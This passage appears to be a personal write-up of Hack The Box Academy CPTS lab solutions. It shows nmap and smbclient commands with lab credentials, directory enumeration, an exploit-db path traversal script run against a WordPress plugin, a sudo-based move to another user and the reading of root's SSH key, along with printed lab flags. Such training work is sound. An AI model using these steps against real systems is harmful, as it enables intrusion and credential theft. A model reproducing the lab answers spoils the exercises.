      Nibbles - Initial Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nibbles-privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      Nibbles - Privilege Escalation
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#knowledge-check" class="md-nav__link">
    <span class="md-ellipsis">
      Knowledge Check
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#network-enumeration-with-nmap" class="md-nav__link">
    <span class="md-ellipsis">
      Network Enumeration with Nmap
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Network Enumeration with Nmap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#host-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Host Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Host Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#host-discovery" class="md-nav__link">
    <span class="md-ellipsis">
      Host Discovery
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#host-and-port-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      Host and Port Scanning
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#saving-the-results" class="md-nav__link">
    <span class="md-ellipsis">
      Saving the Results
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#service-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Service Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nmap-scripting-engine" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap Scripting Engine
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bypass-security-measures" class="md-nav__link">
    <span class="md-ellipsis">
      Bypass Security Measures
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Bypass Security Measures">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#firewall-and-idsips-evasion-easy-lab" class="md-nav__link">
    <span class="md-ellipsis">
      Firewall and IDS/IPS Evasion - Easy Lab
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#firewall-and-idsips-evasion-medium-lab" class="md-nav__link">
    <span class="md-ellipsis">
      Firewall and IDS/IPS Evasion - Medium Lab
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#firewall-and-idsips-evasion-hard-lab" class="md-nav__link">
    <span class="md-ellipsis">
      Firewall and IDS/IPS Evasion - Hard Lab
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#footprinting" class="md-nav__link">
    <span class="md-ellipsis">
      Footprinting
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Footprinting">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#host-based-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Host Based Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Host Based Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ftp" class="md-nav__link">
    <span class="md-ellipsis">
      FTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb" class="md-nav__link">
    <span class="md-ellipsis">
      SMB
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nfs" class="md-nav__link">
    <span class="md-ellipsis">
      NFS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns" class="md-nav__link">
    <span class="md-ellipsis">
      DNS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smtp" class="md-nav__link">
    <span class="md-ellipsis">
      SMTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#imap-pop3" class="md-nav__link">
    <span class="md-ellipsis">
      IMAP / POP3
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#snmp" class="md-nav__link">
    <span class="md-ellipsis">
      SNMP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mysql" class="md-nav__link">
    <span class="md-ellipsis">
      MySQL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mssql" class="md-nav__link">
    <span class="md-ellipsis">
      MSSQL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#oracle-tns" class="md-nav__link">
    <span class="md-ellipsis">
      Oracle TNS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ipmi" class="md-nav__link">
    <span class="md-ellipsis">
      IPMI
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Skills assessment
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Skills assessment">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#footprinting-lab-easy" class="md-nav__link">
    <span class="md-ellipsis">
      Footprinting Lab - Easy
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#footprinting-lab-medium" class="md-nav__link">
    <span class="md-ellipsis">
      Footprinting Lab - Medium
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#footprinting-lab-hard" class="md-nav__link">
    <span class="md-ellipsis">
      Footprinting Lab - Hard
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#information-gathering-web-edition" class="md-nav__link">
    <span class="md-ellipsis">
      Information Gathering - Web Edition
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Information Gathering - Web Edition">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#whois" class="md-nav__link">
    <span class="md-ellipsis">
      WHOIS
    </span>
  </a>
  
    <nav class="md-nav" aria-label="WHOIS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#utilizing-whois" class="md-nav__link">
    <span class="md-ellipsis">
      Utilizing WHOIS
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns-subdomains" class="md-nav__link">
    <span class="md-ellipsis">
      DNS &amp; Subdomains
    </span>
  </a>
  
    <nav class="md-nav" aria-label="DNS & Subdomains">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#digging-dns" class="md-nav__link">
    <span class="md-ellipsis">
      Digging DNS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#subdomain-bruteforcing" class="md-nav__link">
    <span class="md-ellipsis">
      Subdomain BruteForcing
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns-zone-transfers" class="md-nav__link">
    <span class="md-ellipsis">
      DNS Zone Transfers
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#virtual-hosts" class="md-nav__link">
    <span class="md-ellipsis">
      Virtual Hosts
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fingerprinting" class="md-nav__link">
    <span class="md-ellipsis">
      Fingerprinting
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Fingerprinting">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fingerprinting_1" class="md-nav__link">
    <span class="md-ellipsis">
      Fingerprinting
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#crawling" class="md-nav__link">
    <span class="md-ellipsis">
      Crawling
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Crawling">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#creepy-crawlies" class="md-nav__link">
    <span class="md-ellipsis">
      Creepy crawlies
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-archives" class="md-nav__link">
    <span class="md-ellipsis">
      Web Archives
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment_1" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vulnerability-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerability Assessment
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Vulnerability Assessment">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nesus" class="md-nav__link">
    <span class="md-ellipsis">
      Nesus
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Nesus">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nessus-skills-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Nessus Skills assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#openvass" class="md-nav__link">
    <span class="md-ellipsis">
      Openvass
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Openvass">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#openvass-skills-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Openvass Skills assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#file-transfers" class="md-nav__link">
    <span class="md-ellipsis">
      File Transfers
    </span>
  </a>
  
    <nav class="md-nav" aria-label="File Transfers">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#windows-file-transfer-methods" class="md-nav__link">
    <span class="md-ellipsis">
      Windows File Transfer methods
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux-file-transfer-methods" class="md-nav__link">
    <span class="md-ellipsis">
      Linux File Transfer methods
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shells-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      Shells &amp; Payloads
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Shells & Payloads">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#shell-basics" class="md-nav__link">
    <span class="md-ellipsis">
      Shell Basics
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#payloads" class="md-nav__link">
    <span class="md-ellipsis">
      Payloads
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-shells" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Shells
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nix-shells" class="md-nav__link">
    <span class="md-ellipsis">
      NIX Shells
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-shells" class="md-nav__link">
    <span class="md-ellipsis">
      Web Shells
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Web Shells">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#laudanum" class="md-nav__link">
    <span class="md-ellipsis">
      laudanum
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#antak-webshell" class="md-nav__link">
    <span class="md-ellipsis">
      antak webshell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php-shells" class="md-nav__link">
    <span class="md-ellipsis">
      php shells
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment_2" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#using-the-metasploit-framework" class="md-nav__link">
    <span class="md-ellipsis">
      Using the Metasploit Framework
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Using the Metasploit Framework">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#introduction-to-metasploit" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction to Metasploit
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#msf-components" class="md-nav__link">
    <span class="md-ellipsis">
      MSF Components
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#msf-sessions" class="md-nav__link">
    <span class="md-ellipsis">
      MSF Sessions
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#password-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Password Attacks
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Password Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#remote-password-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Remote Password Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-local-password-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Local Password Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux-local-password-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Linux Local Password Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-lateral-movement" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Lateral Movement
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-files" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking Files
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment-1-password-attack-easy" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment 1: Password Attack Easy
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment-2-password-attack-medium" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment 2: Password Attack Medium
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment-3-password-attack-hard" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment 3: Password Attack Hard
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attacking-common-services" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking Common Services
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Common Services">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ftp_1" class="md-nav__link">
    <span class="md-ellipsis">
      FTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb_1" class="md-nav__link">
    <span class="md-ellipsis">
      SMB
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-databases" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Databases
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  <!-- Overwrites content.html base mkdocs theme, taken from 
https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -->



<h1 id="cpts-labs">CPTS labs</h1>
<h2 id="getting-started"><a href="https://academy.hackthebox.com/module/details/77">Getting Started</a></h2>
<h3 id="pentesting-basics">Pentesting Basics</h3>
<h4 id="service-scanning"><a href="https://academy.hackthebox.com/module/77/section/726">Service scanning</a></h4>
<p><strong>Perform an Nmap scan of the target. What does Nmap display as the version of the service running on port 8080?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>sudo nmap -sC -sV -p8080 $ip 
</span></code></pre></div></td></tr></table></div>
<p><strong>Results</strong>: Apache Tomcat</p>
<p><strong>Perform an Nmap scan of the target and identify the non-default port that the telnet service is running on.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>sudo nmap -sC -sV $ip
</span></code></pre></div></td></tr></table></div>
<p><strong>Results</strong>: 2323</p>
<p><strong>List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
<span class="normal"><a href="#__codelineno-2-2">2</a></span>
<span class="normal"><a href="#__codelineno-2-3">3</a></span>
<span class="normal"><a href="#__codelineno-2-4">4</a></span>
<span class="normal"><a href="#__codelineno-2-5">5</a></span>
<span class="normal"><a href="#__codelineno-2-6">6</a></span>
<span class="normal"><a href="#__codelineno-2-7">7</a></span>
<span class="normal"><a href="#__codelineno-2-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>smbclient  /\/\10.129.125.178/\users -U bob
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a># password: Welcome1. Included in the path explanation
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>smb&gt;dir
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>smb&gt;cd flag
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>smb&gt;get flag.txt
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a>smb&gt;quit
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a>cat flag.txt
</span></code></pre></div></td></tr></table></div>
<p><strong>Results</strong>: dceece590f3284c3866305eb2473d099</p>
<h4 id="web-enumeration"><a href="https://academy.hackthebox.com/module/77/section/728">Web Enumeration</a></h4>
<p><strong>Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
<span class="normal"><a href="#__codelineno-3-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>dirb http://94.237.55.246:55655/    
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a># From enumeration you can get to dirb http://94.237.55.246:55655/robots.txt
</span></code></pre></div></td></tr></table></div>
<p>Go to http://94.237.55.246:55655/robots.txt and you will notice http://94.237.55.246:55655/admin-login-page.php</p>
<p>Visit it and, hardcoded in the site you will see:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>                &lt;!-- TODO: remove test credentials admin:password123 --&gt;
</span></code></pre></div></td></tr></table></div>
<p>Login into the app.</p>
<p><strong>Results</strong>: HTB{w3b_3num3r4710n_r3v34l5_53cr375}There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:</p>
<h4 id="public-exploits"><a href="https://academy.hackthebox.com/module/77/section/843">Public Exploits</a></h4>
<p>Access to the web app at http://ip:36883</p>
<p>The title of the wordpress post is "Simple Backup Plugin 2.7.10", which is a well-known vulnerable plugin. </p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>searchsploit Simple Backup Plugin 2.7.10
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
<span class="normal"><a href="#__codelineno-6-2">2</a></span>
<span class="normal"><a href="#__codelineno-6-3">3</a></span>
<span class="normal"><a href="#__codelineno-6-4">4</a></span>
<span class="normal"><a href="#__codelineno-6-5">5</a></span>
<span class="normal"><a href="#__codelineno-6-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>----------------------------------------------------------- ---------------------------------
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a> Exploit Title                                             |  Path
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>----------------------------------------------------------- ---------------------------------
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a>Simple Backup Plugin Python Exploit 2.7.10 - Path Traversa | php/webapps/51937.txt
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a>----------------------------------------------------------- ---------------------------------
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a>Shellcodes: No Results
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
<span class="normal"><a href="#__codelineno-7-2">2</a></span>
<span class="normal"><a href="#__codelineno-7-3">3</a></span>
<span class="normal"><a href="#__codelineno-7-4">4</a></span>
<span class="normal"><a href="#__codelineno-7-5">5</a></span>
<span class="normal"><a href="#__codelineno-7-6">6</a></span>
<span class="normal"><a href="#__codelineno-7-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>sudo cp /usr/share/exploitdb/exploits/php/webapps/51937.txt .
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>mv 51937.txt 51937.py
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a>chmod +x 51937.py
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a>python ./51937.py http://83.136.255.162:36883/ &quot;/flag.txt&quot; 4
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a>#  target_url = sys.argv[1]
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6"></a>#  file_name = sys.argv[2]
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7"></a>#  depth = int(sys.argv[3])
</span></code></pre></div></td></tr></table></div>
<p><strong>Results</strong>: HTB{my_f1r57_h4ck}</p>
<h4 id="privilege-escalation"><a href="https://academy.hackthebox.com/module/77/section/844">Privilege Escalation</a></h4>
<p><strong>SSH to $ip with user "user1" and password "password1". SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-8-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-8-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-8-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-8-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-8-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-8-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-8-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-8-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-8-10">10</a></span>
<span class="normal"><a href="#__codelineno-8-11">11</a></span>
<span class="normal"><a href="#__codelineno-8-12">12</a></span>
<span class="normal"><a href="#__codelineno-8-13">13</a></span>
<span class="normal"><a href="#__codelineno-8-14">14</a></span>
<span class="normal"><a href="#__codelineno-8-15">15</a></span>
<span class="normal"><a href="#__codelineno-8-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>ssh user1@$ip -p 31459
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a># password1
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a>sudo -l
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a># User user1 may run the following commands on
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6"></a>#        ng-644144-gettingstartedprivesc-udbk3-5969ffb656-cp248:
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7"></a>#    (user2 : user2) NOPASSWD: /bin/bash
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8"></a>
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9"></a># One way: 
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10"></a>echo #!/bin/bash &gt; lala.sh
</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11"></a>echo cat /home/user2/flag.txt &gt;&gt; lala.sh
</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12"></a>chmod +x lala.sh
</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13"></a>sudo -u user2  /bin/bash lala.sh
</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14"></a>
</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15"></a># Another
</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16"></a>sudo -u user2 /bin/bash -i
</span></code></pre></div></td></tr></table></div>
<p><strong>Results</strong>:  HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}</p>
<p><strong>Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.</strong></p>
<p>Once you are user2, go to /root:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
<span class="normal"><a href="#__codelineno-9-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>cd /root
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>ls -la
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
<span class="normal"><a href="#__codelineno-10-2">2</a></span>
<span class="normal"><a href="#__codelineno-10-3">3</a></span>
<span class="normal"><a href="#__codelineno-10-4">4</a></span>
<span class="normal"><a href="#__codelineno-10-5">5</a></span>
<span class="normal"><a href="#__codelineno-10-6">6</a></span>
<span class="normal"><a href="#__codelineno-10-7">7</a></span>
<span class="normal"><a href="#__codelineno-10-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>drwxr-x--- 1 root user2 4096 Feb 12  2021 .
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a>drwxr-xr-x 1 root root  4096 Jun  3 19:21 ..
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a>-rwxr-x--- 1 root user2    5 Aug 19  2020 .bash_history
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4"></a>-rwxr-x--- 1 root user2 3106 Dec  5  2019 .bashrc
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5"></a>-rwxr-x--- 1 root user2  161 Dec  5  2019 .profile
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6"></a>drwxr-x--- 1 root user2 4096 Feb 12  2021 .ssh
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7"></a>-rwxr-x--- 1 root user2 1309 Aug 19  2020 .viminfo
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8"></a>-rw------- 1 root root    33 Feb 12  2021 flag.txt
</span></code></pre></div></td></tr></table></div>
<p>So we have read access in .ssh folder. We can access and copy the private key </p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
<span class="normal"><a href="#__codelineno-11-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>cd .ssh
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>cat id_rsa
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span>
<span class="normal"><a href="#__codelineno-12-2">2</a></span>
<span class="normal"><a href="#__codelineno-12-3">3</a></span>
<span class="normal"><a href="#__codelineno-12-4">4</a></span>
